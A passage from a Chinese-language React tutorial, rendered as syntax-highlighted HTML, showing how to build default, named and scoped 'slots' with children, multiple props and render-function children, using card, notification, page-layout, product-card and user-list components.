      <span class="hljs-attr">maxWidth:</span> '<span class="hljs-attr">300px</span>' 
    }}&gt;</span>
      {children || defaultContent}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// 父组件：使用卡片组件</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>', <span class="hljs-attr">gap:</span> '<span class="hljs-attr">20px</span>', <span class="hljs-attr">padding:</span> '<span class="hljs-attr">20px</span>' }}&gt;</span>
      {/* 传入自定义内容 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">BasicCard</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"user-card"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> 
          <span class="hljs-attr">src</span>=<span class="hljs-string">"https://via.placeholder.com/80"</span> 
          <span class="hljs-attr">alt</span>=<span class="hljs-string">"用户头像"</span> 
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">borderRadius:</span> '<span class="hljs-attr">50</span>%', <span class="hljs-attr">marginBottom:</span> '<span class="hljs-attr">10px</span>' }}
        /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">margin:</span> '<span class="hljs-attr">0</span> <span class="hljs-attr">0</span> <span class="hljs-attr">8px</span> <span class="hljs-attr">0</span>' }}&gt;</span>李华<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">margin:</span> '<span class="hljs-attr">0</span>', <span class="hljs-attr">color:</span> '#<span class="hljs-attr">666</span>' }}&gt;</span>前端开发工程师<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">BasicCard</span>&gt;</span>

      {/* 未传入内容（显示默认值） */}
      <span class="hljs-tag">&lt;<span class="hljs-name">BasicCard</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"empty-card"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-4">实例 2：带条件渲染的默认插槽</h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// 子组件：通知组件（根据类型显示不同默认图标）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Notification</span>(<span class="hljs-params">{ children, type = <span class="hljs-string">'info'</span> }</span>) {
  <span class="hljs-comment">// 根据类型生成默认图标</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDefaultIcon</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">switch</span>(type) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'success'</span>: <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">color:</span> '<span class="hljs-attr">green</span>' }}&gt;</span>✅<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'error'</span>: <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">color:</span> '<span class="hljs-attr">red</span>' }}&gt;</span>❌<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'warning'</span>: <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">color:</span> '<span class="hljs-attr">orange</span>' }}&gt;</span>⚠️<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>;
      <span class="hljs-attr">default</span>: <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">color:</span> '<span class="hljs-attr">blue</span>' }}&gt;</span>ℹ️<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>;
    }
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> 
      <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>', 
      <span class="hljs-attr">alignItems:</span> '<span class="hljs-attr">center</span>', 
      <span class="hljs-attr">gap:</span> '<span class="hljs-attr">8px</span>', 
      <span class="hljs-attr">padding:</span> '<span class="hljs-attr">12px</span>', 
      <span class="hljs-attr">backgroundColor:</span> '#<span class="hljs-attr">f5f5f5</span>', 
      <span class="hljs-attr">borderRadius:</span> '<span class="hljs-attr">4px</span>' 
    }}&gt;</span>
      {getDefaultIcon()}
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{children}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// 父组件使用</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">20px</span>', <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>', <span class="hljs-attr">flexDirection:</span> '<span class="hljs-attr">column</span>', <span class="hljs-attr">gap:</span> '<span class="hljs-attr">10px</span>' }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Notification</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"success"</span>&gt;</span>操作成功！<span class="hljs-tag">&lt;/<span class="hljs-name">Notification</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Notification</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"error"</span>&gt;</span>提交失败，请重试<span class="hljs-tag">&lt;/<span class="hljs-name">Notification</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Notification</span>&gt;</span>这是一条普通通知<span class="hljs-tag">&lt;/<span class="hljs-name">Notification</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h2 data-id="heading-5">三、命名插槽：多区域内容精准分发</h2>
<p>当组件需要划分多个固定区域（如头部、主体、底部）时，使用「命名插槽」实现精准内容分发。React 中无原生「命名插槽」语法，但通过「多 props 传递」或「children 对象」两种方案均可实现，适用于布局组件、复杂卡片等场景。</p>
<h3 data-id="heading-6">方案 1：多 props 传递（推荐，简洁直观）</h3>
<p>通过不同名称的 props 接收不同区域的内容，是最常用的命名插槽实现方式，可读性强，易于维护。</p>
<h4 data-id="heading-7">实例：页面布局组件（头部、侧边栏、主体、底部）</h4>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// 子组件：布局组件（定义 4 个命名插槽）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">PageLayout</span>(<span class="hljs-params">{ header, sidebar, content, footer, isSidebarLeft = <span class="hljs-literal">true</span> }</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>', <span class="hljs-attr">flexDirection:</span> '<span class="hljs-attr">column</span>', <span class="hljs-attr">minHeight:</span> '<span class="hljs-attr">100vh</span>' }}&gt;</span>
      {/* 头部插槽 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> 
        <span class="hljs-attr">backgroundColor:</span> '#<span class="hljs-attr">2c3e50</span>', 
        <span class="hljs-attr">color:</span> '<span class="hljs-attr">white</span>', 
        <span class="hljs-attr">padding:</span> '<span class="hljs-attr">16px</span>', 
        <span class="hljs-attr">textAlign:</span> '<span class="hljs-attr">center</span>' 
      }}&gt;</span>
        {header}
      <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>

      {/* 主体+侧边栏容器 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>', <span class="hljs-attr">flex:</span> <span class="hljs-attr">1</span> }}&gt;</span>
        {/* 侧边栏插槽（支持左右切换） */}
        {isSidebarLeft &amp;&amp; (
          <span class="hljs-tag">&lt;<span class="hljs-name">aside</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> 
            <span class="hljs-attr">width:</span> '<span class="hljs-attr">200px</span>', 
            <span class="hljs-attr">backgroundColor:</span> '#<span class="hljs-attr">ecf0f1</span>', 
            <span class="hljs-attr">padding:</span> '<span class="hljs-attr">16px</span>', 
            <span class="hljs-attr">borderRight:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">ddd</span>' 
          }}&gt;</span>
            {sidebar}
          <span class="hljs-tag">&lt;/<span class="hljs-name">aside</span>&gt;</span>
        )}

        {/* 主体内容插槽 */}
        <span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">flex:</span> <span class="hljs-attr">1</span>, <span class="hljs-attr">padding:</span> '<span class="hljs-attr">24px</span>' }}&gt;</span>
          {content}
        <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>

        {!isSidebarLeft &amp;&amp; (
          <span class="hljs-tag">&lt;<span class="hljs-name">aside</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> 
            <span class="hljs-attr">width:</span> '<span class="hljs-attr">200px</span>', 
            <span class="hljs-attr">backgroundColor:</span> '#<span class="hljs-attr">ecf0f1</span>', 
            <span class="hljs-attr">padding:</span> '<span class="hljs-attr">16px</span>', 
            <span class="hljs-attr">borderLeft:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">ddd</span>' 
          }}&gt;</span>
            {sidebar}
          <span class="hljs-tag">&lt;/<span class="hljs-name">aside</span>&gt;</span>
        )}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

      {/* 底部插槽 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">footer</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> 
        <span class="hljs-attr">backgroundColor:</span> '#<span class="hljs-attr">2c3e50</span>', 
        <span class="hljs-attr">color:</span> '<span class="hljs-attr">white</span>', 
        <span class="hljs-attr">padding:</span> '<span class="hljs-attr">8px</span>', 
        <span class="hljs-attr">textAlign:</span> '<span class="hljs-attr">center</span>' 
      }}&gt;</span>
        {footer}
      <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// 父组件使用</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">PageLayout</span>
      // <span class="hljs-attr">头部插槽内容</span>
      <span class="hljs-attr">header</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">h1</span>&gt;</span>我的博客<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>}
      // 侧边栏插槽内容
      sidebar={
        <span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>', <span class="hljs-attr">flexDirection:</span> '<span class="hljs-attr">column</span>', <span class="hljs-attr">gap:</span> '<span class="hljs-attr">12px</span>' }}&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">color:</span> '#<span class="hljs-attr">333</span>', <span class="hljs-attr">textDecoration:</span> '<span class="hljs-attr">none</span>' }}&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/article"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">color:</span> '#<span class="hljs-attr">333</span>', <span class="hljs-attr">textDecoration:</span> '<span class="hljs-attr">none</span>' }}&gt;</span>文章列表<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/about"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">color:</span> '#<span class="hljs-attr">333</span>', <span class="hljs-attr">textDecoration:</span> '<span class="hljs-attr">none</span>' }}&gt;</span>关于我<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
      }
      // 主体插槽内容
      content={
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>React 插槽详解<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>本文介绍 React 中插槽的多种实现方式，帮助开发者灵活扩展组件...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      }
      // 底部插槽内容
      footer={<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>© 2025 我的博客 版权所有<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>}
      // 侧边栏在右侧
      isSidebarLeft={false}
    /&gt;</span>
  );
}
</code></pre>
<h3 data-id="heading-8">方案 2：children 对象（模拟 Vue 具名插槽语法）</h3>
<p>将 <code>children</code> 设计为对象，键名为插槽名称，键值为插槽内容，语法更接近 Vue 的具名插槽，适用于习惯 Vue 语法的开发者， 不推荐使用，不直观多此一举</p>
<h4 data-id="heading-9">实例：商品卡片组件（标题、描述、价格、操作区）</h4>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// 子组件：商品卡片（接收 children 对象作为命名插槽）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductCard</span>(<span class="hljs-params">{ children, style }</span>) {
  <span class="hljs-comment">// 解构插槽内容，设置默认值</span>
  <span class="hljs-keyword">const</span> { 
    title = <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>默认商品名称<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span>,
    description = <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>暂无商品描述<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>,
    price = <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">color:</span> '<span class="hljs-attr">red</span>' }}&gt;</span>¥0.00<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>,
    action = <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>加入购物车<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  } = children || {};

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> 
      <span class="hljs-attr">border:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">eee</span>', 
      <span class="hljs-attr">borderRadius:</span> '<span class="hljs-attr">8px</span>', 
      <span class="hljs-attr">padding:</span> '<span class="hljs-attr">16px</span>', 
      <span class="hljs-attr">width:</span> '<span class="hljs-attr">280px</span>',
      <span class="hljs-attr">...style</span>
    }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">marginBottom:</span> '<span class="hljs-attr">12px</span>' }}&gt;</span>{title}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">marginBottom:</span> '<span class="hljs-attr">12px</span>', <span class="hljs-attr">color:</span> '#<span class="hljs-attr">666</span>', <span class="hljs-attr">fontSize:</span> '<span class="hljs-attr">14px</span>' }}&gt;</span>{description}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">marginBottom:</span> '<span class="hljs-attr">16px</span>', <span class="hljs-attr">fontSize:</span> '<span class="hljs-attr">18px</span>', <span class="hljs-attr">fontWeight:</span> '<span class="hljs-attr">bold</span>' }}&gt;</span>{price}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">textAlign:</span> '<span class="hljs-attr">center</span>' }}&gt;</span>{action}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// 父组件使用</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>', <span class="hljs-attr">gap:</span> '<span class="hljs-attr">20px</span>', <span class="hljs-attr">padding:</span> '<span class="hljs-attr">20px</span>' }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ProductCard</span>&gt;</span>
        {{
          title: <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">margin:</span> '<span class="hljs-attr">0</span>' }}&gt;</span>无线蓝牙耳机<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>,
          description: <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">margin:</span> '<span class="hljs-attr">0</span>' }}&gt;</span>降噪功能 | 续航24小时 | 防水防汗<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>,
          price: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">color:</span> '<span class="hljs-attr">red</span>' }}&gt;</span>¥399.00<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>,
          action: (
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>', <span class="hljs-attr">gap:</span> '<span class="hljs-attr">8px</span>', <span class="hljs-attr">justifyContent:</span> '<span class="hljs-attr">center</span>' }}&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">6px</span> <span class="hljs-attr">12px</span>', <span class="hljs-attr">backgroundColor:</span> '#<span class="hljs-attr">42b983</span>', <span class="hljs-attr">color:</span> '<span class="hljs-attr">white</span>', <span class="hljs-attr">border:</span> '<span class="hljs-attr">none</span>', <span class="hljs-attr">borderRadius:</span> '<span class="hljs-attr">4px</span>' }}&gt;</span>
                加入购物车
              <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">6px</span> <span class="hljs-attr">12px</span>', <span class="hljs-attr">backgroundColor:</span> '#<span class="hljs-attr">fff</span>', <span class="hljs-attr">color:</span> '#<span class="hljs-attr">42b983</span>', <span class="hljs-attr">border:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">42b983</span>', <span class="hljs-attr">borderRadius:</span> '<span class="hljs-attr">4px</span>' }}&gt;</span>
                立即购买
              <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          )
        }}
      <span class="hljs-tag">&lt;/<span class="hljs-name">ProductCard</span>&gt;</span>

      <span class="hljs-tag">&lt;<span class="hljs-name">ProductCard</span>&gt;</span>
        {{
          title: <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">margin:</span> '<span class="hljs-attr">0</span>' }}&gt;</span>智能手表<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>,
          price: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">color:</span> '<span class="hljs-attr">red</span>' }}&gt;</span>¥899.00<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          // 未传入 description 和 action，使用默认值
        }}
      <span class="hljs-tag">&lt;/<span class="hljs-name">ProductCard</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h2 data-id="heading-10">四、作用域插槽：子组件向父组件传递数据</h2>
<p>作用域插槽（Scoped Slot）的核心是「子组件提供数据，父组件决定如何渲染」，适用于子组件持有数据但渲染逻辑需灵活定制的场景（如列表渲染、数据展示格式化）。React 中通过「render props」或「函数作为 children」实现，两者本质一致，均是将数据通过函数参数传递给父组件。</p>
<h3 data-id="heading-11">方案 1：函数作为 children（更简洁，推荐）</h3>
<p>直接将 <code>children</code> 设计为函数，子组件调用该函数时传入数据，父组件通过函数参数接收数据并渲染。</p>
<h4 data-id="heading-12">实例：用户列表组件（子组件提供用户数据，父组件定制渲染）</h4>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 子组件：用户列表（提供数据，暴露给父组件渲染）</span>
<span class="hljs-selector-tag">function</span> <span class="hljs-selector-tag">UserList</span>({ <span class="hljs-selector-tag">data</span>, <span class="hljs-selector-tag">children</span> }) {
  <span class="hljs-selector-tag">if</span> (!data || data.length === <span class="hljs-number">0</span>) {
    <span class="hljs-selector-tag">return</span> &lt;<span class="hljs-selector-tag">div</span> <span class="hljs-selector-tag">style</span>={{ <span class="hljs-attribute">padding</span>: <span class="hljs-string">'20px'</span>, <span class="hljs-attribute">textAlign</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attribute">color</span>: <span class="hljs-string">'#666'</span> }}&gt;暂无用户数据&lt;/div&gt;;
  }

  return (
    &lt;div style={{ <span class="hljs-attribute">border</span>: <span class="hljs-string">'1px solid #eee'</span>, <span class="hljs-attribute">borderRadius</span>: <span class="hljs-string">'8px'</span>, <span class="hljs-attribute">overflow</span>: <span class="hljs-string">'hidden'</span> }}&gt;
      {data.<span class="hljs-built_in">map</span>((user, index) =&gt; (
        <span class="hljs-comment">// 调用 children 函数，传递用户数据和索引</span>
        &lt;div 
          key={user.id} 
          style={{ 
            <span class="hljs-attribute">padding</span>: <span class="hljs-string">'16px'</span>, 
            <span class="hljs-attribute">borderBottom</span>: index &lt; data.length - <span class="hljs-number">1</span> ? <span class="hljs-string">'1px solid #eee'</span> : <span class="hljs-string">'none'</span>,
            <span class="hljs-attribute">backgroundColor</span>: index % <span class="hljs-number">2</span> === <span class="hljs-number">0</span> ? <span class="hljs-string">'#fff'</span> : <span class="hljs-string">'#f9f9f9'</span>
          }}
        &gt;
          {<span class="hljs-built_in">children</span>(user, index)}
        &lt;/div&gt;
      ))}
    &lt;/div&gt;
  );
}

<span class="hljs-comment">// 父组件使用：定制不同的渲染逻辑</span>
function <span class="hljs-built_in">App</span>() {
  <span class="hljs-comment">// 模拟用户数据</span>
  <span class="hljs-selector-tag">const</span> <span class="hljs-selector-tag">userData</span> = <span class="hljs-selector-attr">[    { id: 1, name: <span class="hljs-string">'张三'</span>, age: 28, role: <span class="hljs-string">'管理员'</span>, avatar: <span class="hljs-string">'https://via.placeholder.com/40'</span> },    { id: 2, name: <span class="hljs-string">'李四'</span>, age: 24, role: <span class="hljs-string">'普通用户'</span>, avatar: <span class="hljs-string">'https://via.placeholder.com/40'</span> },    { id: 3, name: <span class="hljs-string">'王五'</span>, age: 32, role: <span class="hljs-string">'VIP用户'</span>, avatar: <span class="hljs-string">'https://via.placeholder.com/40'</span> }  ]</span>;

  <span class="hljs-selector-tag">return</span> (
    &lt;div style={{ <span class="hljs-attribute">padding</span>: <span class="hljs-string">'20px'</span>, <span class="hljs-attribute">display</span>: <span class="hljs-string">'flex'</span>, <span class="hljs-attribute">gap</span>: <span class="hljs-string">'20px'</span> }}&gt;
      {<span class="hljs-comment">/* 渲染方式 1：简洁卡片式 */</span>}
      &lt;UserList data={<span class="hljs-selector-tag">userData</span>}&gt;
        {(<span class="hljs-selector-tag">user</span>) =&gt; (
          &lt;div style={{ <span class="hljs-attribute">display</span>: <span class="hljs-string">'flex'</span>, <span class="hljs-attribute">alignItems</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attribute">gap</span>: <span class="hljs-string">'12px'</span> }}&gt;
            &lt;img src={<span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.avatar</span>} <span class="hljs-selector-tag">alt</span>={<span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.name</span>} <span class="hljs-selector-tag">style</span>={{ borderRadius: '50%' }} /&gt;
            &lt;div&gt;
              &lt;div style={{ fontWeight: 'bold' }}&gt;{<span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.name</span>}&lt;/<span class="hljs-selector-tag">div</span>&gt;
              &lt;<span class="hljs-selector-tag">div</span> <span class="hljs-selector-tag">style</span>={{ fontSize: '12px', <span class="hljs-attribute">color</span>: <span class="hljs-string">'#666'</span> }}&gt;{<span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.role</span>}&lt;/<span class="hljs-selector-tag">div</span>&gt;
            &lt;/<span class="hljs-selector-tag">div</span>&gt;
          &lt;/<span class="hljs-selector-tag">div</span>&gt;
        )}
      &lt;/<span class="hljs-selector-tag">UserList</span>&gt;

      {<span class="hljs-comment">/* 渲染方式 2：详细信息式 */</span>}
      &lt;UserList data={<span class="hljs-selector-tag">userData</span>}&gt;
        {(<span class="hljs-selector-tag">user</span>, <span class="hljs-selector-tag">index</span>) =&gt; (
          &lt;div&gt;
            &lt;div style={{ <span class="hljs-attribute">display</span>: <span class="hljs-string">'flex'</span>, <span class="hljs-attribute">alignItems</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attribute">gap</span>: <span class="hljs-string">'8px'</span>, <span class="hljs-attribute">marginBottom</span>: <span class="hljs-string">'8px'</span> }}&gt;
              &lt;span style={{ backgroundColor: '#42b983', <span class="hljs-attribute">color</span>: <span class="hljs-string">'white'</span>, <span class="hljs-attribute">padding</span>: <span class="hljs-string">'2px 8px'</span>, <span class="hljs-attribute">borderRadius</span>: <span class="hljs-string">'12px'</span>, <span class="hljs-attribute">fontSize</span>: <span class="hljs-string">'12px'</span> }}&gt;
                {<span class="hljs-selector-tag">index</span> + <span class="hljs-number">1</span>}
              &lt;/<span class="hljs-selector-tag">span</span>&gt;
              &lt;<span class="hljs-selector-tag">h4</span> <span class="hljs-selector-tag">style</span>={{ <span class="hljs-attribute">margin</span>: <span class="hljs-string">'0'</span> }}&gt;{<span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.name</span>}&lt;/<span class="hljs-selector-tag">h4</span>&gt;
            &lt;/<span class="hljs-selector-tag">div</span>&gt;
            &lt;<span class="hljs-selector-tag">div</span> <span class="hljs-selector-tag">style</span>={{ fontSize: '14px', <span class="hljs-attribute">color</span>: <span class="hljs-string">'#666'</span> }}&gt;年龄：{<span class="hljs-selector-tag">user</span><span class="hljs-selector-class">.age</span>}岁&lt;/<span class="hljs-selector-tag">div</span>&gt;
